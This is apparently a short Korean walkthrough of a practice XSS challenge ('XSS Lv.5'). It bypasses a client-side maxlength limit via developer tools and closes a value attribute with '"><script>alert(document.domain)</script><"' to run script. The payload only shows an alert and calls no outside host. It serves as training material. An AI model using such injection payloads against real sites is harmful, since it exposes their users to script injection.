# <p align="center">🎁XSS Lv.5</p>
- 문제 조건
  - 경고창에 domain 띄우기
  - 길이 제한이 걸린 입력칸이 있음

- 문제풀이
  - ```<script>alert(document.domain)</script>``` 입력을 못함
  - 뭔가 안 되는걸 확인했으니 개발자 도구 확인
  - input태그의 max길이가 15로 되있는걸 43 이상으로 바꿈
  - ```<script>alert(document.domain)</script>``` 입력
  - ```value="<script>alert(document.domain)</script>"```로 입력됨
  - ```"><script>alert(document.domain)</script><"```로 바꿔서 입력
  - -끗-

- 부가설명
  - ```"><script>alert(document.domain)</script><"``` 이렇게 넣으면<br/>
결과적으로 ```value=""><script>alert(document.domain)</script><"">```가 되어<br/>
제대로 원하는 결과를 도출할 수 있다.